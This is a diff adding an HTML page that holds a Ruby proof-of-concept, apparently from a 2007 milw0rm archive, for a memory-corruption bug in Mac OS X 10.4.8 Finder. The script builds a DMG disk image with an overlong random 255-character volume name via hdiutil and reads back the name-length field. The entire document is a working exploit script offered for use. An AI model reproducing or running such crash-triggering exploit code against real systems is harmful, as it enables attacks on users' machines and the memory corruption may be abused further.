@@ -1,0 +1,27 @@
+<html><head><title>Mac OS X 10.4.8 Apple Finder DMG Volume Name Memory Corruption PoC</title></head><pre>#!/usr/bin/ruby
+# (c) 2006 LMH &lt;lmh [at] infopull.com&gt;.
+#
+
+require 'fileutils'
+require 'zlib'
+
+hdiutil = &quot;/usr/bin/hdiutil&quot;
+dmgname = (ARGV[0] || &quot;MOAB-09-01-2007.dmg&quot;)
+dmgsize = (ARGV[1] || &quot;200k&quot;)
+filesys = (ARGV[2] || &quot;UFS&quot;)
+volname = &quot;&quot;
+
+255.times do
+  volname &lt;&lt; (i = Kernel.rand(62); i += ((i &lt; 10) ? 48 : ((i &lt; 36) ? 55 : 61 ))).chr
+end
+
+FileUtils.rm_f(dmgname)
+system &quot;#{hdiutil} create #{dmgname} -size #{dmgsize} -fs #{filesys} -volname #{volname}&quot;
+
+puts &quot;++ reading #{dmgname}...&quot;
+dmg_stream = File.read(dmgname)
+dmg_vnsize = dmg_stream[0x9c10,0x9c14].unpack(&quot;C2&quot;)
+puts &quot;++ volname length at dmg: #{dmg_vnsize}&quot;
+puts &quot;++ dmg size: #{dmg_stream.size} bytes.&quot;
+
+# milw0rm.com [2007-01-09]</pre></html>
